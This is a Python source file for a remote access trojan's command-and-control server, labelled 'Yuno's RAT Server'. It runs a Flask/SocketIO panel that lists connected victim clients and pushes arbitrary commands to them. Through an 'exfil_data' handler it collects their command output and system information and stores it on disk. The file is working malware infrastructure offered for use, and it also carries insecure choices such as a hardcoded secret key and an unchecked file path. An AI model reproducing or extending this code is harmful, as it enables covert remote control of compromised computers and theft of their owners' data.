#!/usr/bin/env python3
import os
import json
from datetime import datetime
from flask import Flask, render_template, request, jsonify, url_for
from flask_socketio import SocketIO, emit
import base64
import threading

# Server settings
HOST = "0.0.0.0"
DATA_DIR = "rat_data"

# Ensure data directory exists
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# Store connected clients (client_id -> socket session ID)
clients = {}
clients_lock = threading.Lock()

# Store command outputs (client_id -> list of {command, output, timestamp})
command_outputs = {}
outputs_lock = threading.Lock()

# Flask app and SocketIO
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'  # Needed for SocketIO
socketio = SocketIO(app, cors_allowed_origins="*")

@socketio.on('connect')
def handle_connect():
    client_id = f"client_{request.remote_addr}_{request.sid}"
    print(f"[*] New client connected: {client_id}")
    with clients_lock:
        clients[client_id] = request.sid
    with outputs_lock:
        if client_id not in command_outputs:
            command_outputs[client_id] = []

@socketio.on('disconnect')
def handle_disconnect():
    client_id = f"client_{request.remote_addr}_{request.sid}"
    print(f"[*] Client disconnected: {client_id}")
    with clients_lock:
        if client_id in clients:
            del clients[client_id]

@socketio.on('exfil_data')
def handle_exfil_data(data):
    client_id = f"client_{request.remote_addr}_{request.sid}"
    try:
        client_data = json.loads(data)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Handle different data types
        if client_data.get("type") == "command_output":
            # Store command output in memory
            with outputs_lock:
                command_outputs[client_id].append({
                    "command": client_data["command"],
                    "output": client_data["output"],
                    "timestamp": timestamp
                })
            # Broadcast to web interface
            socketio.emit('command_output', {
                "client_id": client_id,
                "command": client_data["command"],
                "output": client_data["output"],
                "timestamp": timestamp
            }, broadcast=True)
        else:
            # Save system info to disk
            filename = f"{DATA_DIR}/{client_id}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(client_data, f, indent=2)
            print(f"[*] Received data from {client_id}: Saved to {filename}")
    except json.JSONDecodeError:
        print(f"[!] Invalid data from {client_id}: {data}")

def send_command(client_id, command):
    with clients_lock:
        if client_id in clients:
            try:
                socketio.emit('command', command, to=clients[client_id])
                print(f"[*] Sent command to {client_id}: {command}")
                return True, f"Sent command to {client_id}: {command}"
            except Exception as e:
                print(f"[!] Failed to send command to {client_id}: {e}")
                return False, f"Failed to send command: {e}"
        else:
            print(f"[!] Client {client_id} not found")
            return False, "Client not found"

# Flask Routes for Web Interface
@app.route('/')
def index():
    with clients_lock:
        client_list = list(clients.keys())
    files = os.listdir(DATA_DIR)
    return render_template('index.html', clients=client_list, files=files)

@app.route('/send_command', methods=['POST'])
def handle_send_command():
    client_id = request.form.get('client_id')
    command = request.form.get('command')
    if client_id and command:
        success, message = send_command(client_id, command)
        return jsonify({"success": success, "message": message})
    return jsonify({"success": False, "message": "Invalid client ID or command"})

@app.route('/view_file/<filename>')
def view_file(filename):
    filepath = os.path.join(DATA_DIR, filename)
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            data = json.load(f)
        return render_template('view_file.html', filename=filename, data=data)
    return "File not found", 404

if __name__ == "__main__":
    print("=== Yuno's RAT Server ===")
    print("A remote access tool by Yuno\n")
    socketio.run(app, host='0.0.0.0', port=5000)